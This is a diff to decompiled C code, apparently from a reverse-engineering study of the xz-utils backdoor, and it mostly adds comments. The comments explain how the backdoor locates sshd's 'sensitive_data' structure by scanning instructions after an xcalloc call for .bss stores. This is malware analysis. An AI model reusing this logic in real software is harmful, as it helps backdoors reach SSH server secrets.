@@ -5,11 +5,7 @@
 
 
 /*
- * AutoDoc: Consults the precomputed string-reference table to find the code region that contains sshd's zero-initialisation
- * `xcalloc` call. Immediately after each matching CALL it scans the next handful of instructions for stores into .bss,
- * records up to sixteen unique destinations, and looks for three consecutive slots separated by eight bytes (ptr, ptr+8,
- * ptr+0x10). That stride pattern matches the layout of `sensitive_data`, so the lowest address of the triplet becomes the
- * preferred candidate.
+ * AutoDoc: Consults the cached string references to find sshd's zero-initialisation `xcalloc` call, watches the next handful of instructions for `.bss` stores of the return value, and records up to sixteen unique destinations. Whenever it sees three pointers separated by eight bytes (ptr/ptr+8/ptr+0x10) it treats the lowest slot as the `sensitive_data` base.
  */
 
 #include "xzre_types.h"
@@ -35,6 +31,7 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
   u8 *store_hits[16];
   
   *sensitive_data_out = (void *)0x0;
+  // AutoDoc: Use the precomputed string catalogue to seed the scan with the `xcalloc` call site.
   xcalloc_call_target = (u8 *)(string_refs->xcalloc_zero_size).func_start;
   if (xcalloc_call_target == (u8 *)0x0) {
     return FALSE;
@@ -55,9 +52,11 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
 LAB_001036eb:
   do {
     if ((code_end <= code_start) ||
+       // AutoDoc: Hunt for the direct CALL into `xcalloc`; each hit restarts the post-call analysis window.
        (decode_ok = find_call_instruction(code_start,code_end,xcalloc_call_target,&store_probe_ctx), decode_ok == FALSE))
     goto LAB_00103802;
     code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
+    // AutoDoc: Immediately scan the following bytes for a MOV [mem],reg instruction that stores the allocated pointer.
     decode_ok = find_instruction_with_mem_operand_ex
                       (code_start,code_start + 0x20,&store_probe_ctx,0x109,(void *)0x0);
   } while (decode_ok == FALSE);
@@ -90,6 +89,7 @@ LAB_00103782:
   if (((store_probe_ctx.prefix.flags_u16 & 0x100) != 0) &&
      (store_operand_ptr = (u8 *)store_probe_ctx.mem_disp,
      ((uint)store_probe_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
+    // AutoDoc: Convert the RIP-relative store into an absolute `.bss` pointer before recording it.
     store_operand_ptr = (u8 *)(store_probe_ctx.mem_disp + (long)store_probe_ctx.instruction) + store_probe_ctx.instruction_size;
   }
   if ((data_start <= store_operand_ptr) && (store_operand_ptr < data_end)) {
@@ -107,6 +107,7 @@ LAB_00103802:
         do {
           hit_compare_idx = 0;
           do {
+            // AutoDoc: Look for three slots spaced eight bytes apart; that stride matches the struct layout (base, base+8, base+0x10).
             if (((void *)store_hits[clear_idx] == (void *)(store_hits[hit_scan_idx] + -8)) &&
                (store_hits[hit_scan_idx] == store_hits[hit_compare_idx] + -8)) {
               *sensitive_data_out = (void *)store_hits[clear_idx];
